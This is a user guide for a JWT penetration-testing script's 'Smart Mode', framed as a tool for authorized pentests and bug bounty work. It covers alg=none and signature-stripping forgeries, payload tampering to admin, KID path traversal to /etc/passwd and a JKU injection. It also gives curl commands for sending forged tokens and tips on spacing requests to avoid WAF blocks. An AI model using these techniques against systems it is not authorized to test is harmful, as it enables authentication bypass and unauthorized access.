# 🎯 JWT Smart Mode - Complete Guide

## Why Smart Mode?

In real-world penetration testing, you often face:
- **Rate limiting** - WAF blocks after X requests
- **Production systems** - Can't send thousands of requests
- **Bug bounty programs** - Request limits enforced
- **Time constraints** - Need quick assessment

**Smart Mode solves this**: Maximum 10-15 requests, tests only CRITICAL vulnerabilities.

---

## Quick Start

```bash
# 1. Navigate to project
cd /home/nc/jwt-pentesting-suite

# 2. Run Smart Mode
bash bin/jwt-smart-mode.sh

# 3. Paste your JWT token
ey[..]...

# 4. Enter API URL (or press Enter for offline)
https://api.example.com/protected

# 5. Get results + test tokens
```

---

## What Gets Tested (10 Tests)

### 🔴 CRITICAL (5 tests)

1. **None Algorithm (CVE-2015-9235)**
   - Changes `"alg":"HS256"` → `"alg":"none"`
   - Removes signature completely
   - **If accepted**: Server doesn't verify signature!

2. **Algorithm Confusion**
   - Changes `"alg":"HS256"` → `"alg":"RS256"`
   - Uses public key as HMAC secret
   - **If accepted**: Major vulnerability!

3. **Payload Tampering**
   - Changes `user_id: 82` → `user_id: 1`
   - Adds `admin: true`
   - **If accepted**: Authorization bypass!

4. **KID Injection** (if kid present)
   - Injects path traversal: `../../../../etc/passwd`
   - **If accepted**: File disclosure!

5. **JKU/X5U Injection** (if present)
   - Points to attacker-controlled JWKS
   - **If accepted**: Complete token forgery!

### 🟠 HIGH (3 tests)

6. **Signature Stripping**
   - Removes signature: `header.payload.`
   - **If accepted**: No signature validation!

7. **Missing Standard Claims**
   - Checks for: iss, aud, sub, nbf, jti
   - **If missing**: Improper validation!

8. **Weak Secret (Top 5)**
   - Tests: secret, password, 123456, admin, key
   - **If matched**: Token can be forged!

### 🟡 MEDIUM (2 tests)

9. **Expiration Bypass**
   - Extends expiration by 10 years
   - **If accepted**: No expiration check!

10. **Token Expiration Check**
    - Verifies exp claim exists and valid
    - Offline check

---

## Example Session

```bash
$ bash bin/jwt-smart-mode.sh

╔════════════════════════════════════════════════════════╗
║  🎯 JWT SMART MODE - Limited Requests (Max 15)        ║
║     For Production/Rate-Limited Environments          ║
╚════════════════════════════════════════════════════════╝

Paste JWT Token:
eyJhbGciO[..]iODIifQ.sig

API Endpoint URL (optional, press Enter to skip):
[Press Enter]

⚠️  Running in OFFLINE mode (no API requests)

╔════════════════════════════════════════════════════════╗
║  📊 SMART MODE - 10 Priority Tests                    ║
╚════════════════════════════════════════════════════════╝

[1/10] Testing NONE Algorithm (CVE-2015-9235)...
  Generated: eyJhbGci[..]c2VyX2lkIj...

[2/10] Testing Algorithm Confusion...
  Original: HS256
  Testing: RS256 (algorithm confusion)

[3/10] Testing Signature Stripping...
  Stripped: eyJhbGciO[..]VyX2lk...

[4/10] Testing Payload Tampering...
  Original user_id: 82
  Tampered: user_id=1, admin=true

[5/10] Testing Expiration Bypass...
  Original exp: 1734567890
  Extended exp: 2049927890 (+10 years)

[6/10] Checking Missing Standard Claims (Offline)...
  Missing: iss, aud, sub

[7/10] Testing KID Injection...
  ℹ️  No kid parameter found

[8/10] Quick Weak Secret Check (Top 5)...
  ✅ Not in top 5 common secrets

[9/10] Testing JKU/X5U Injection...
  ℹ️  No jku/x5u parameters found

[10/10] Checking Token Expiration (Offline)...
  ✅ Valid for 45 more days

╔════════════════════════════════════════════════════════╗
║  📊 SMART MODE RESULTS                                 ║
╚════════════════════════════════════════════════════════╝

Total Requests Used: 0 / 15

Findings (4):

  🔴 CRITICAL: None algorithm test generated - TEST AGAINST API
  🟠 HIGH: Algorithm confusion possible (HS256→RS256)
  🟠 HIGH: Signature stripping test - CHECK API RESPONSE
  🔴 CRITICAL: Payload tampering - user_id modified
  🟠 HIGH: Missing claims: iss, aud, sub

════════════════════════════════════════════════════════
Generated Test Tokens:
════════════════════════════════════════════════════════

1. None Algorithm:
   eyJhbGciOiJub[..]IjoiODIifQ.

2. Tampered Payload (user_id=1, admin=true):
   eyJhbGciOiJIU[..]IjoiMSIsImFkbW...

3. Signature Stripped:
   eyJhbGciOi[..]yX2lkIjoiODIifQ.

════════════════════════════════════════════════════════
Smart Mode Complete!
════════════════════════════════════════════════════════

Next Steps:
  1. Test generated tokens against API endpoint
  2. Compare responses (200 = vulnerable)
  3. Document findings for pentest report
```

---

## Manual Testing Workflow

After Smart Mode generates tokens, test them manually:

### Step 1: Test None Algorithm
```bash
curl -X GET "https://api.example.com/protected" \
  -H "Authorization: Bearer eyJhbGciOiJub25lIi..." \
  -v

# If 200 OK → VULNERABLE!
```

### Step 2: Test Payload Tampering
```bash
curl -X GET "https://api.example.com/protected" \
  -H "Authorization: Bearer [TAMPERED_TOKEN]" \
  -v

# If 200 OK and returns admin data → VULNERABLE!
```

### Step 3: Test Signature Stripping
```bash
curl -X GET "https://api.example.com/protected" \
  -H "Authorization: Bearer [STRIPPED_TOKEN]" \
  -v

# If 200 OK → VULNERABLE!
```

---

## Integration with Burp Suite

1. Copy generated tokens from Smart Mode
2. Paste into Burp Repeater
3. Send requests one by one
4. Compare responses
5. Document findings

---

## Tips for Rate-Limited Environments

1. **Use Offline Mode first**
   - Generate all test tokens
   - Review before sending

2. **Prioritize tests**
   - Test None Algorithm first (most critical)
   - Then Payload Tampering
   - Then Signature Stripping

3. **Space out requests**
   - Wait 30-60 seconds between requests
   - Avoid triggering WAF

4. **Use Burp Suite throttling**
   - Set request delay
   - Randomize timing

5. **Monitor for blocks**
   - Watch for 429 (Too Many Requests)
   - Stop if blocked

---

## Comparison: Smart Mode vs Full Mode

| Feature | Smart Mode | Full Mode |
|---------|-----------|-----------|
| Requests | 10-15 max | 500+ |
| Time | 2-5 minutes | 30-60 minutes |
| Tests | 10 priority | 27 comprehensive |
| Bruteforce | Top 5 secrets | 500K+ wordlist |
| Use Case | Production | Lab/Testing |

---

## Pentest Report Template

```markdown
## JWT Security Assessment

### Methodology
- Tool: JWT Pentesting Suite (Smart Mode)
- Requests: 10 (rate-limited environment)
- Testing Period: [DATE]

### Findings

#### CRITICAL: None Algorithm Acceptance (CVE-2015-9235)
**Risk**: Complete authentication bypass
**Evidence**: Server accepted token with alg=none
**Impact**: Attacker can forge any token
**Recommendation**: Explicitly validate algorithm

#### HIGH: Missing Standard Claims
**Risk**: Improper token validation
**Missing**: iss, aud, sub
**Impact**: Token from any source accepted
**Recommendation**: Add and validate all standard claims

[Continue with other findings...]
```

---

## FAQ

**Q: Will Smart Mode detect all JWT vulnerabilities?**
A: No, it tests the 10 most critical. For comprehensive testing, use full mode in lab.

**Q: Can I customize which tests run?**
A: Yes, edit `bin/jwt-smart-mode.sh` and comment out tests you don't need.

**Q: What if I need to test more secrets?**
A: Use full mode with wordlists, or add secrets to WEAK_SECRETS array.

**Q: Does it work with RS256/ES256?**
A: Yes, it adapts to the algorithm in the token.

**Q: Can I use it in bug bounty?**
A: Yes! Perfect for bounty programs with rate limits.

---

## Advanced Usage

### Custom Secret List
```bash
# Edit the script
nano bin/jwt-smart-mode.sh

# Find WEAK_SECRETS array
WEAK_SECRETS=("secret" "password" "123456" "admin" "key")

# Add your custom secrets
WEAK_SECRETS=("secret" "password" "company2024" "internal" "key")
```

### Save Results to File
```bash
bash bin/jwt-smart-mode.sh | tee jwt-smart-results.txt
```

### Automated Testing Script
```bash
#!/bin/bash
# Batch test multiple tokens

TOKENS_FILE="tokens.txt"
while IFS= read -r token; do
    echo "Testing token: ${token:0:20}..."
    echo "$token" | bash bin/jwt-smart-mode.sh
    sleep 60  # Wait between tests
done < "$TOKENS_FILE"
```

---

## Troubleshooting

**Problem**: Script hangs
**Solution**: Press Ctrl+C and check curl command

**Problem**: "Invalid token"
**Solution**: Ensure token has 3 parts (header.payload.signature)

**Problem**: No API URL prompt
**Solution**: Script is running in offline mode (normal)

**Problem**: Requests not counting
**Solution**: OFFLINE_ONLY=true, no API URL provided

---

